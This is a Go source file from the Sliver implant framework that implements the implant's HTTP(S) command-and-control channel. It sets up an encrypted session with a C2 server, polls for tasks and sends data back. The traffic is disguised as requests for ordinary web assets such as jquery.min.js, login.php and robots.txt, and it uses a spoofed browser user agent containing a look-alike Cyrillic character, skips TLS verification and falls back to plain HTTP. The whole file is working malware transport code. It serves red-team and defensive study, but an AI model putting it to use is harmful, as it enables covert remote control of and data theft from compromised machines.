package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .HTTPc2Enabled}}

// Procedural C2
// ===============
// .txt = rsakey
// .css = start
// .php = session
//  .js = poll
// .png = stop

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"strings"

	"sync"
	// {{if .Debug}}
	"log"
	// {{end}}

	"math/rand"
	"net"
	"net/http"
	"net/url"
	"path"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/proxy"

	"github.com/golang/protobuf/proto"
)

const (
	// IE 11 User-agent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
	defaultUserAgent  = "Mozillа/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
	defaultNetTimeout = time.Second * 60
	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
)

// HTTPStartSession - Attempts to start a session with a given address
func HTTPStartSession(address string) (*SliverHTTPClient, error) {
	var client *SliverHTTPClient
	client = httpsClient(address, true)
	err := client.SessionInit()
	if err != nil {
		// If we're using default ports then switch to 80
		if strings.HasSuffix(address, ":443") {
			address = fmt.Sprintf("%s:80", address[:len(address)-4])
		}
		client = httpClient(address, true) // Fallback to insecure HTTP
		err = client.SessionInit()
		if err != nil {
			return nil, err
		}
	}
	return client, nil
}

// SliverHTTPClient - Helper struct to keep everything together
type SliverHTTPClient struct {
	Origin     string
	Client     *http.Client
	SessionKey *AESKey
	SessionID  string
}

// SessionInit - Initailize the session
func (s *SliverHTTPClient) SessionInit() error {
	publicKey := s.getPublicKey()
	if publicKey == nil {
		// {{if .Debug}}
		log.Printf("Invalid public key")
		// {{end}}
		return errors.New("error")
	}
	skey := RandomAESKey()
	s.SessionKey = &skey
	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
	data, _ := proto.Marshal(httpSessionInit)
	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("RSA encrypt failed %v", err)
		// {{end}}
		return err
	}
	err = s.getSessionID(encryptedSessionInit)
	if err != nil {
		return err
	}
	return nil
}

func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *http.Request {
	req, _ := http.NewRequest(method, uri, body)
	req.Header.Set("User-Agent", defaultUserAgent)
	req.Header.Set("Accept-Language", "en-US")
	return req
}

func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
	uri := s.txtURL()
	// {{if .Debug}}
	log.Printf("[http] GET -> %s", uri)
	// {{end}}
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] Failed to fetch server public key: %v", err)
		// {{end}}
		return nil
	}
	// {{if .Debug}}
	log.Printf("[http] <- %d Server key response", resp.StatusCode)
	// {{end}}
	data, _ := ioutil.ReadAll(resp.Body)
	pubKeyBlock, _ := pem.Decode(data)
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("[http] Failed to parse certificate PEM")
		// {{end}}
		return nil
	}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		// {{if .Debug}}
		log.Printf("[http] Got a valid public key")
		// {{end}}
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("[http] Invalid certificate %v", err)
	// {{end}}
	return nil
}

// We do our own POST here because the server doesn't have the
// session key yet.
func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
	uri := s.cssURL()
	req := s.newHTTPRequest(http.MethodPost, uri, reader)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("send failed")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
	if err != nil {
		return err
	}
	s.SessionID = string(sessionID)
	// {{if .Debug}}
	log.Printf("[http] New session id: %v", s.SessionID)
	// {{end}}
	return nil
}

// Poll - Perform an HTTP GET request
func (s *SliverHTTPClient) Poll() ([]byte, error) {
	if s.SessionID == "" || s.SessionKey == nil {
		return nil, errors.New("no session")
	}
	uri := s.jsURL()
	req := s.newHTTPRequest(http.MethodGet, uri, nil)
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] GET failed %v", err)
		// {{end}}
		return nil, err
	}
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return nil, errors.New("Non-200 response code")
	}
	if resp.StatusCode == 403 {
		// {{if .Debug}}
		log.Printf("Server responded with invalid session for %v", s.SessionID)
		// {{end}}
		return nil, errors.New("invalid session")
	}
	respData, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	return GCMDecrypt(*s.SessionKey, respData)
}

// Send - Perform an HTTP POST request
func (s *SliverHTTPClient) Send(data []byte) error {
	if s.SessionID == "" || s.SessionKey == nil {
		return errors.New("no session")
	}
	reqData, err := GCMEncrypt(*s.SessionKey, data)
	reader := bytes.NewReader(reqData)
	uri := s.phpURL()
	// {{if .Debug}}
	log.Printf("[http] POST -> %s", uri)
	// {{end}}
	req := s.newHTTPRequest(http.MethodPost, uri, reader)
	resp, err := s.Client.Do(req)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[http] POST failed %v", err)
		// {{end}}
		return err
	}
	if resp.StatusCode != 200 {
		return errors.New("send failed")
	}
	return nil
}

func (s *SliverHTTPClient) jsURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"js", "static", "assets", "dist", "javascript"}
	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) cssURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
	filenames := []string{"bootstrap.min.css"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) phpURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"api", "rest", "drupal", "wordpress"}
	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) txtURL() string {
	curl, _ := url.Parse(s.Origin)
	segments := []string{"static", "www", "assets", "textual", "docs", "sample"}
	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
	curl.Path = path.Join(s.randomPath(segments, filenames)...)
	return curl.String()
}

func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
	seed := rand.NewSource(time.Now().UnixNano())
	insecureRand := rand.New(seed)
	n := insecureRand.Intn(2) // How many segements?
	genSegments := []string{}
	for index := 0; index < n; index++ {
		seg := segments[insecureRand.Intn(len(segments))]
		genSegments = append(genSegments, seg)
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}

// [ HTTP(S) Clients ] ------------------------------------------------------------

func httpClient(address string, useProxy bool) *SliverHTTPClient {
	httpTransport := &http.Transport{
		Dial:                proxy.Direct.Dial,
		TLSHandshakeTimeout: defaultNetTimeout,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("http://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   defaultReqTimeout,
			Transport: httpTransport,
		},
	}
	if useProxy {
		p := proxy.NewProvider("").GetHTTPProxy(client.Origin)
		if p != nil {
			// {{if .Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "http"
			}
			// {{if .Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			httpTransport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	return client
}

func httpsClient(address string, useProxy bool) *SliverHTTPClient {
	netTransport := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: defaultNetTimeout,
		}).Dial,
		TLSHandshakeTimeout: defaultNetTimeout,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
	}
	client := &SliverHTTPClient{
		Origin: fmt.Sprintf("https://%s", address),
		Client: &http.Client{
			Jar:       cookieJar(),
			Timeout:   defaultReqTimeout,
			Transport: netTransport,
		},
	}
	if useProxy {
		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
		if p != nil {
			// {{if .Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			netTransport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	return client
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

// {{end}} -HTTPc2Enabled
